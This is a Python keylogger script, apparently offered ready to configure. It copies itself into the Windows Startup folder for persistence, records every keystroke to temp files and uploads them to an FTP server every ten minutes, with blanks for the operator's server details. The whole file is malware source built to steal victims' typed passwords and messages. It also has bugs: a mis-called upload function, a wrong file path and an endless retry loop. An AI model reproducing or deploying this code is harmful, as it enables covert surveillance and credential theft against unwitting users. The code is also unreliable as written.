#!/usr/bin/python3
# -*- coding: utf-8 -*-

##########################################################
###                 Edit line: 108                     ###
##########################################################

import os
import keyboard
import tempfile
import shutil
import sys

from ftplib import FTP
from threading import Timer
from datetime import datetime

# Move this file in startup directory

if os.name == 'nt':
	startup_dir = f'{os.getenv("SystemDrive")}\\Users\\{str(os.getlogin()).strip()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
	if os.path.exists(startup_dir):
		current_file = sys.argv[0]
		shutil.move(current_file, startup_dir + '\\' + os.path.basename(__file__))


class KL(object):
	def __init__(self, interval = 600, directory = tempfile.gettempdir(), ftp_pass=None, ftp_host=None, ftp_user=None, ftp_pub_folder=None):
		super(KL, self).__init__()
		self.interval = int(interval)
		self.temp_dir = directory
		self.login_data = {
			'ftp_host': ftp_host,
			'ftp_user': ftp_user,
			'ftp_pass': ftp_pass,
			'ftp_pub_folder': ftp_pub_folder
		}

		self.temp_logs = ''


	def filter(self, event):
		event_name = event.name
		if len(event_name) > 1:
			if event_name == 'space':
				event_name = ' '
			elif event_name == 'shift':
				event_name = ''
			elif event_name == 'decimal':
				event_name = '.'
			elif event_name == 'enter':
				event_name = '[ENTER]\n'
			elif event_name == 'ctrl':
				event_name = ''
			elif event_name == 'backspace':
				event_name = '[DELETE]'
			else:
				event_name = ''
		self.temp_logs += event_name


	def update_file(self):
		dt = datetime.now()
		self.filename = f'hello-{dt.day}-{dt.month}-{dt.year}_{dt.hour}-{dt.minute}-{dt.second}.txt'
		with open (f'{self.temp_dir}\\{self.filename}', 'w') as log:
			print(self.temp_logs, file=log)
			log.close()


	def start_listen(self):
		keyboard.on_release(callback=self.filter)
		self.send_data()
		keyboard.wait()



	def send_ftp(self, username, password, public_directory):
		with FTP(self.login_data['ftp_host']) as ftp:
			ftp.login(self.login_data['ftp_user'], self.login_data['ftp_pass'])
			ftp.cwd(self.login_data['ftp_pub_folder'])

			self.update_file()
			uploadfile = open(self.filename, 'rb')
			ftp.storlines(f'STOR {self.filename}', uploadfile)
			print('[1] Successfully Sent.')
			uploadfile.close()



	def send_data(self):
		if self.temp_logs:
			try:
				self.send_ftp()
				self.temp_logs = ''
			except Exception as err:
				print(f'[0] {err}')
				upload_func = self.send_ftp()
				while not upload_func:
					upload_func = self.send_ftp()

		
		timer = Timer(interval=self.interval, function=self.send_data)
		timer.daemon = True
		timer.start()


if __name__ == '__main__':
	logger = KL(interval=600, ftp_pass='', ftp_user='', ftp_host='', ftp_pub_folder='')
	logger.start_listen()
